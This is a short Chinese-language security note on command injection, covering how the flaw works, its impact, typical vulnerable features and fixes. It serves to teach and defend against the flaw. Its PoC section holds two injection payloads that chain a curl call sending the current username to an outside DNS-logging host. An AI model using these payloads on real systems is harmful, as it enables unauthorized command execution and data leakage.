

# 漏洞原理

**命令注入（Command Injection）**漏洞是指攻击者通过**注入**恶意命令来执行非预期的操作；简单来说就是没有对用户输入的内容充分的验证或过滤，而直接带入到命令执行函数中当成系统命令被执行。



# 漏洞危害

1. 执行任意系统命令，可能导致系统被完全控制。
2. 敏感信息泄露，如密码、数据库内容等。
3. 对系统进行拒绝服务（DoS）攻击。
4. 执行恶意代码，如安装后门、植入恶意软件等。



# 常见场景

- 管理界面的配置主机名/IP/掩码/网关、查看系统信息等功能处
- 关闭、重启等功能处
- ping、nslookup等验证主机等功能处
- 提供发送邮件、转换图片等功能处
- 私钥生成
- 通过数据库执行



# POC

```shell
# Win
|| curl %USERNAME%.8f208c4a.ipv6.1433.eu.org

# Linux
|| curl `whoami`.8f208c4a.ipv6.1433.eu.org
```



# 漏洞修复

1. **输入验证和过滤：**对于从用户或外部源接收的所有输入数据，进行严格的验证和过滤。确保只允许预期的输入字符和格式，并拒绝潜在的恶意代码。
2. **权限限制：**确保应用程序在执行命令时使用最低特权。不要在命令执行中使用超级用户权限或管理员权限，以降低攻击者可能获得的权限。
3. **沙箱环境：**在可能的情况下，将应用程序或相关组件运行在沙箱环境中，以限制其对系统的访问权限。这可以帮助隔离恶意代码的影响，并提供额外的安全层。
